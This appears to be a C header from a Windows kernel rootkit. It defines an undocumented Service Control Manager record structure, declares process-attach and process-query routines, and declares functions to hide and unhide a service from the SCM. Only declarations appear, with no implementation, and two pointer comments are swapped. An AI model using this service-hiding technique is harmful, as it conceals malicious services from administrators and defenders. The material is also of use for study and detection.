#ifndef _SERVICE_H_
   #define _SERVICE_H_

#include "pe.h"

// typedef of a service
typedef struct _SERVICE_RECORD {
   struct _SERVICE_RECORD *PreviousServiceRecord; // next struct
   struct _SERVICE_RECORD *NextServiceRecord; // previous one
   WCHAR *Lp_WideServiceName;    // service name
   WCHAR *Dupe_WideServiceName;  // display name
   ULONG struct_size;          
   ULONG unknown0;
   ULONG sErv;
   ULONG unknown1;
   WCHAR *Lp_WideFullServicePath; // full path :)   
   ULONG dwServiceType;           // startup type
   ULONG dwCurrentState;          // service state
} SERVICE_RECORD, *PSERVICE_RECORD;

NTSYSAPI 
NTSTATUS 
NTAPI ZwOpenProcess(
   OUT PHANDLE ProcessHandle, 
   IN ACCESS_MASK DesiredAccess, 
   IN POBJECT_ATTRIBUTES ObjectAttributes, 
   IN PCLIENT_ID ClientId);

// attach & detach a process
NTSYSAPI 
NTSTATUS 
NTAPI KeAttachProcess( PEPROCESS proc );
NTSYSAPI 
NTSTATUS 
NTAPI KeDetachProcess();

NTSYSAPI 
NTSTATUS 
NTAPI ZwQueryInformationProcess(
  HANDLE ProcessHandle,
  PROCESSINFOCLASS ProcessInformationClass,
  PVOID ProcessInformation,
  ULONG ProcessInformationLength,
  PULONG ReturnLength
);

NTSTATUS HideFromSCManager(WCHAR *service);
NTSTATUS UnhideFromSCManager();


#endif
